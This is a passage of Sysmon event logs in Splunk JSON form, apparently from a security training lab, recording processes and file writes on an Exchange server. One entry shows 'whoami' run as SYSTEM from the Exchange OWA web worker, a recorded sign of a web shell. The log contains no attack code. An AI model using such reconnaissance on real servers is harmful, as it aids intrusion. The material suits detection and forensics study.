{"log":{"CommandLine":"whoami","Company":"Microsoft Corporation","ComputerName":"WIN_SERVER.masterschool.local","CurrentDirectory":"c:\\windows\\system32\\inetsrv\\","Description":"whoami - displays logged on user information","EventCode":"1","EventType":"4","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","Image":"C:\\Windows\\System32\\whoami.exe","IntegrityLevel":"System","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{72893ba8-111d-6139-e703-000000000000}","LogonId":"0x3E7","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:50.888\r\nProcessGuid: {72893ba8-1456-6139-0302-000000000c00}\r\nProcessId: 1832\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: whoami\r\nCurrentDirectory: c:\\windows\\system32\\inetsrv\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nParentProcessId: 12264\r\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\r\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","OpCode":"Info","OriginalFileName":"whoami.exe","ParentCommandLine":"c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","ParentImage":"C:\\Windows\\System32\\inetsrv\\w3wp.exe","ParentProcessGuid":"{72893ba8-120b-6139-2101-000000000c00}","ParentProcessId":"12264","ProcessGuid":"{72893ba8-1456-6139-0302-000000000c00}","ProcessId":"1832","Product":"Microsoft® Windows® Operating System","RecordNumber":"2757","RuleName":"-","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"0","Type":"Information","User":["NOT_TRANSLATED","NT AUTHORITY\\SYSTEM"],"UtcTime":"2022-11-29 19:51:50.888","_raw":"11/29/2022 03:51:50 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2757\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:50.888\r\nProcessGuid: {72893ba8-1456-6139-0302-000000000c00}\r\nProcessId: 1832\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: whoami\r\nCurrentDirectory: c:\\windows\\system32\\inetsrv\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=43C2D3293AD939241DF61B3630A9D3B6,SHA256=1D5491E3C468EE4B4EF6EDFF4BBC7D06EE83180F6F0B1576763EA2EFE049493A,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nParentProcessId: 12264\r\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\r\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","_time":"2022-11-29T12:51:50.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"37","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_-\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
{"log":{"ComputerName":"WIN_SERVER.masterschool.local","CreationUtcTime":"2022-11-29 19:51:50.801","EventCode":"11","EventType":"4","Image":"c:\\windows\\system32\\inetsrv\\w3wp.exe","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","Message":"File created:\r\nRuleName: DLL\r\nUtcTime: 2022-11-29 19:51:50.802\r\nProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nProcessId: 12264\r\nImage: c:\\windows\\system32\\inetsrv\\w3wp.exe\r\nTargetFilename: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\owa\\8e05b027\\e164d61b\\App_Web_ck1ttezf.dll\r\nCreationUtcTime: 2022-11-29 19:51:50.801","OpCode":"Info","ProcessGuid":"{72893ba8-120b-6139-2101-000000000c00}","ProcessId":"12264","RecordNumber":"2756","RuleName":"DLL","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TargetFilename":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\owa\\8e05b027\\e164d61b\\App_Web_ck1ttezf.dll","TaskCategory":"File created (rule: FileCreate)","Type":"Information","User":"NOT_TRANSLATED","UtcTime":"2022-11-29 19:51:50.802","_raw":"11/29/2022 03:51:50 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=11\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2756\nKeywords=None\nTaskCategory=File created (rule: FileCreate)\nOpCode=Info\nMessage=File created:\r\nRuleName: DLL\r\nUtcTime: 2022-11-29 19:51:50.802\r\nProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nProcessId: 12264\r\nImage: c:\\windows\\system32\\inetsrv\\w3wp.exe\r\nTargetFilename: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\owa\\8e05b027\\e164d61b\\App_Web_ck1ttezf.dll\r\nCreationUtcTime: 2022-11-29 19:51:50.801","_time":"2022-11-29T12:51:50.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"22","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_\\r:_--_::","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
{"log":{"CommandLine":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Windows\\TEMP\\RESCE33.tmp\" \"C:\\Windows\\TEMP\\RESCE32.tmp\"","Company":"Microsoft Corporation","ComputerName":"WIN_SERVER.masterschool.local","CurrentDirectory":"c:\\windows\\system32\\inetsrv\\","Description":"Microsoft® Resource File To COFF Object Conversion Utility","EventCode":"1","EventType":"4","FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","Hashes":"MD5=C877CBB966EA5939AA2A17B6A5160950,SHA256=1FE531EAC592B480AA4BD16052B909C3431434F17E7AE163D248355558CE43A6,IMPHASH=55D76ADE7FFEA0F41FF2B55505C2B362","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","IntegrityLevel":"System","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{72893ba8-111d-6139-e703-000000000000}","LogonId":"0x3E7","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:50.673\r\nProcessGuid: {72893ba8-1456-6139-0102-000000000c00}\r\nProcessId: 1744\r\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe\r\nFileVersion: 14.10.25028.0 built by: VCTOOLSD15RTM\r\nDescription: Microsoft® Resource File To COFF Object Conversion Utility\r\nProduct: Microsoft® .NET Framework\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CVTRES.EXE\r\nCommandLine: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Windows\\TEMP\\RESCE33.tmp\" \"C:\\Windows\\TEMP\\RESCE32.tmp\"\r\nCurrentDirectory: c:\\windows\\system32\\inetsrv\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=C877CBB966EA5939AA2A17B6A5160950,SHA256=1FE531EAC592B480AA4BD16052B909C3431434F17E7AE163D248355558CE43A6,IMPHASH=55D76ADE7FFEA0F41FF2B55505C2B362\r\nParentProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nParentProcessId: 12264\r\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\r\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","OpCode":"Info","OriginalFileName":"CVTRES.EXE","ParentCommandLine":"c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","ParentImage":"C:\\Windows\\System32\\inetsrv\\w3wp.exe","ParentProcessGuid":"{72893ba8-120b-6139-2101-000000000c00}","ParentProcessId":"12264","ProcessGuid":"{72893ba8-1456-6139-0102-000000000c00}","ProcessId":"1744","Product":"Microsoft® .NET Framework","RecordNumber":"2755","RuleName":"-","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"0","Type":"Information","User":["NOT_TRANSLATED","NT AUTHORITY\\SYSTEM"],"UtcTime":"2022-11-29 19:51:50.673","_raw":"11/29/2022 03:51:50 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2755\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:50.673\r\nProcessGuid: {72893ba8-1456-6139-0102-000000000c00}\r\nProcessId: 1744\r\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe\r\nFileVersion: 14.10.25028.0 built by: VCTOOLSD15RTM\r\nDescription: Microsoft® Resource File To COFF Object Conversion Utility\r\nProduct: Microsoft® .NET Framework\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CVTRES.EXE\r\nCommandLine: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:C:\\Windows\\TEMP\\RESCE33.tmp\" \"C:\\Windows\\TEMP\\RESCE32.tmp\"\r\nCurrentDirectory: c:\\windows\\system32\\inetsrv\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=C877CBB966EA5939AA2A17B6A5160950,SHA256=1FE531EAC592B480AA4BD16052B909C3431434F17E7AE163D248355558CE43A6,IMPHASH=55D76ADE7FFEA0F41FF2B55505C2B362\r\nParentProcessGuid: {72893ba8-120b-6139-2101-000000000c00}\r\nParentProcessId: 12264\r\nParentImage: C:\\Windows\\System32\\inetsrv\\w3wp.exe\r\nParentCommandLine: c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"MSExchangeOWAAppPool\" -v \"v4.0\" -c \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\" -a \\\\.\\pipe\\iisipm02ecba3c-c3b8-4c36-b28a-0f20ecab4048 -h \"C:\\inetpub\\temp\\apppools\\MSExchangeOWAAppPool\\MSExchangeOWAAppPool.config\" -w \"\" -m 0","_time":"2022-11-29T12:51:50.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"37","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_-\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
{"log":{"CommandLine":"\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"10768.16.869396986\\750812357\" -childID 7 -isForBrowser -prefsHandle 6068 -prefMapHandle 5544 -prefsLen 6541 -prefMapSize 239843 -jsInit 1468 285716 -parentBuildID 20220823123856 -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 10768 \"\\\\.\\pipe\\gecko-crash-server-pipe.10768\" 6096 19c5ec4cf38 tab","Company":"Mozilla Corporation","ComputerName":"WIN_SERVER.masterschool.local","CurrentDirectory":"C:\\Program Files\\Mozilla Firefox\\","Description":"Firefox","EventCode":"1","EventType":"4","FileVersion":"91.0.2","Hashes":"MD5=C8C9C12BC07D6EBCB91FFA05234DB052,SHA256=E84F523A7F5BDB8367CEB8FD572A7AFAA813AFB2B2C9ABB055B26DC31D444F5E,IMPHASH=6DE9E29DFB7DEB336155C42BCB9F9A14","Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","IntegrityLevel":"Low","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{72893ba8-112c-6139-d45c-040000000000}","LogonId":"0x45CD4","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:22.879\r\nProcessGuid: {72893ba8-143a-6139-0002-000000000c00}\r\nProcessId: 7396\r\nImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nFileVersion: 91.0.2\r\nDescription: Firefox\r\nProduct: Firefox\r\nCompany: Mozilla Corporation\r\nOriginalFileName: firefox.exe\r\nCommandLine: \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"10768.16.869396986\\750812357\" -childID 7 -isForBrowser -prefsHandle 6068 -prefMapHandle 5544 -prefsLen 6541 -prefMapSize 239843 -jsInit 1468 285716 -parentBuildID 20220823123856 -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 10768 \"\\\\.\\pipe\\gecko-crash-server-pipe.10768\" 6096 19c5ec4cf38 tab\r\nCurrentDirectory: C:\\Program Files\\Mozilla Firefox\\\r\nUser: BELLYBEAR\\Administrator\r\nLogonGuid: {72893ba8-112c-6139-d45c-040000000000}\r\nLogonId: 0x45CD4\r\nTerminalSessionId: 1\r\nIntegrityLevel: Low\r\nHashes: MD5=C8C9C12BC07D6EBCB91FFA05234DB052,SHA256=E84F523A7F5BDB8367CEB8FD572A7AFAA813AFB2B2C9ABB055B26DC31D444F5E,IMPHASH=6DE9E29DFB7DEB336155C42BCB9F9A14\r\nParentProcessGuid: {72893ba8-1306-6139-b301-000000000c00}\r\nParentProcessId: 10768\r\nParentImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nParentCommandLine: \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"","OpCode":"Info","OriginalFileName":"firefox.exe","ParentCommandLine":"\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"","ParentImage":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","ParentProcessGuid":"{72893ba8-1306-6139-b301-000000000c00}","ParentProcessId":"10768","ProcessGuid":"{72893ba8-143a-6139-0002-000000000c00}","ProcessId":"7396","Product":"Firefox","RecordNumber":"2740","RuleName":"-","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","BELLYBEAR\\Administrator"],"UtcTime":"2022-11-29 19:51:22.879","_raw":"11/29/2022 03:51:22 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2740\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:51:22.879\r\nProcessGuid: {72893ba8-143a-6139-0002-000000000c00}\r\nProcessId: 7396\r\nImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nFileVersion: 91.0.2\r\nDescription: Firefox\r\nProduct: Firefox\r\nCompany: Mozilla Corporation\r\nOriginalFileName: firefox.exe\r\nCommandLine: \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -contentproc --channel=\"10768.16.869396986\\750812357\" -childID 7 -isForBrowser -prefsHandle 6068 -prefMapHandle 5544 -prefsLen 6541 -prefMapSize 239843 -jsInit 1468 285716 -parentBuildID 20220823123856 -appdir \"C:\\Program Files\\Mozilla Firefox\\browser\" - 10768 \"\\\\.\\pipe\\gecko-crash-server-pipe.10768\" 6096 19c5ec4cf38 tab\r\nCurrentDirectory: C:\\Program Files\\Mozilla Firefox\\\r\nUser: BELLYBEAR\\Administrator\r\nLogonGuid: {72893ba8-112c-6139-d45c-040000000000}\r\nLogonId: 0x45CD4\r\nTerminalSessionId: 1\r\nIntegrityLevel: Low\r\nHashes: MD5=C8C9C12BC07D6EBCB91FFA05234DB052,SHA256=E84F523A7F5BDB8367CEB8FD572A7AFAA813AFB2B2C9ABB055B26DC31D444F5E,IMPHASH=6DE9E29DFB7DEB336155C42BCB9F9A14\r\nParentProcessGuid: {72893ba8-1306-6139-b301-000000000c00}\r\nParentProcessId: 10768\r\nParentImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nParentCommandLine: \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"","_time":"2022-11-29T12:51:22.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"37","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_-\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
{"log":{"CommandLine":"\"netsh\" interface tcp show global","Company":"Microsoft Corporation","ComputerName":"WIN_SERVER.masterschool.local","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Network Command Shell","EventCode":"1","EventType":"4","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC","Image":"C:\\Windows\\System32\\netsh.exe","IntegrityLevel":"System","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{72893ba8-111d-6139-e703-000000000000}","LogonId":"0x3E7","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:50:54.242\r\nProcessGuid: {72893ba8-141e-6139-f801-000000000c00}\r\nProcessId: 7184\r\nImage: C:\\Windows\\System32\\netsh.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Network Command Shell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: netsh.exe\r\nCommandLine: \"netsh\" interface tcp show global\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC\r\nParentProcessGuid: {72893ba8-112e-6139-8d00-000000000c00}\r\nParentProcessId: 6712\r\nParentImage: C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\MSExchangeHMWorker.exe\r\nParentCommandLine: \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\MSExchangeHMWorker.exe\" -pipe:3536 -stopkey:Global\\ExchangeStopKey-b9090b6a-d8ae-49c0-848f-94b2a326b173 -resetkey:Global\\ExchangeResetKey-ba0e3e8b-7290-4251-834b-30e62debb372 -readykey:Global\\ExchangeReadyKey-e342464a-47ba-4008-bbe7-773e9726ada6 -hangkey:Global\\ExchangeHangKey-90a17782-d61b-461a-ae5b-59091b8aa09a -startUpProgressKey:Global\\ExchangeProgressKey-b484b87b-9b1c-4178-88d2-e03db8fb0412 -workerListening","OpCode":"Info","OriginalFileName":"netsh.exe","ParentCommandLine":"\"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\MSExchangeHMWorker.exe\" -pipe:3536 -stopkey:Global\\ExchangeStopKey-b9090b6a-d8ae-49c0-848f-94b2a326b173 -resetkey:Global\\ExchangeResetKey-ba0e3e8b-7290-4251-834b-30e62debb372 -readykey:Global\\ExchangeReadyKey-e342464a-47ba-4008-bbe7-773e9726ada6 -hangkey:Global\\ExchangeHangKey-90a17782-d61b-461a-ae5b-59091b8aa09a -startUpProgressKey:Global\\ExchangeProgressKey-b484b87b-9b1c-4178-88d2-e03db8fb0412 -workerListening","ParentImage":"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\MSExchangeHMWorker.exe","ParentProcessGuid":"{72893ba8-112e-6139-8d00-000000000c00}","ParentProcessId":"6712","ProcessGuid":"{72893ba8-141e-6139-f801-000000000c00}","ProcessId":"7184","Product":"Microsoft® Windows® Operating System","RecordNumber":"2718","RuleName":"-","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"0","Type":"Information","User":["NOT_TRANSLATED","NT AUTHORITY\\SYSTEM"],"UtcTime":"2022-11-29 19:50:54.242","_raw":"11/29/2022 03:50:54 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2718\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: -\r\nUtcTime: 2022-11-29 19:50:54.242\r\nProcessGuid: {72893ba8-141e-6139-f801-000000000c00}\r\nProcessId: 7184\r\nImage: C:\\Windows\\System32\\netsh.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Network Command Shell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: netsh.exe\r\nCommandLine: \"netsh\" interface tcp show global\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {72893ba8-111d-6139-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC\r\nParentProcessGuid: {72893ba8-112e-6139-8d00-000000000c00}\r\nParentProcessId: 6712\r\nParentImage: C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\MSExchangeHMWorker.exe\r\nParentCommandLine: \"C:\\Program Files\\Microsoft\\Exchange Server\\V15.01\\Bin\\MSExchangeHMWorker.exe\" -pipe:3536 -stopkey:Global\\ExchangeStopKey-b9090b6a-d8ae-49c0-848f-94b2a326b173 -resetkey:Global\\ExchangeResetKey-ba0e3e8b-7290-4251-834b-30e62debb372 -readykey:Global\\ExchangeReadyKey-e342464a-47ba-4008-bbe7-773e9726ada6 -hangkey:Global\\ExchangeHangKey-90a17782-d61b-461a-ae5b-59091b8aa09a -startUpProgressKey:Global\\ExchangeProgressKey-b484b87b-9b1c-4178-88d2-e03db8fb0412 -workerListening","_time":"2022-11-29T12:50:54.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"37","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_-\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
{"log":{"ComputerName":"WIN_SERVER.masterschool.local","CreationUtcTime":"2022-11-29 19:50:52.627","EventCode":"11","EventType":"4","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","Message":"File created:\r\nRuleName: DLL\r\nUtcTime: 2022-11-29 19:50:52.627\r\nProcessGuid: {72893ba8-141b-6139-f501-000000000c00}\r\nProcessId: 11016\r\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\nTargetFilename: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\mapi_nspi\\476099e8\\44545f4d\\App_global.asax.axuzyuyd.dll\r\nCreationUtcTime: 2022-11-29 19:50:52.627","OpCode":"Info","ProcessGuid":"{72893ba8-141b-6139-f501-000000000c00}","ProcessId":"11016","RecordNumber":"2717","RuleName":"DLL","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TargetFilename":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\mapi_nspi\\476099e8\\44545f4d\\App_global.asax.axuzyuyd.dll","TaskCategory":"File created (rule: FileCreate)","Type":"Information","User":"NOT_TRANSLATED","UtcTime":"2022-11-29 19:50:52.627","_raw":"11/29/2022 03:50:52 PM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=11\nEventType=4\nComputerName=WIN_SERVER.masterschool.local\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=2717\nKeywords=None\nTaskCategory=File created (rule: FileCreate)\nOpCode=Info\nMessage=File created:\r\nRuleName: DLL\r\nUtcTime: 2022-11-29 19:50:52.627\r\nProcessGuid: {72893ba8-141b-6139-f501-000000000c00}\r\nProcessId: 11016\r\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\nTargetFilename: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\mapi_nspi\\476099e8\\44545f4d\\App_global.asax.axuzyuyd.dll\r\nCreationUtcTime: 2022-11-29 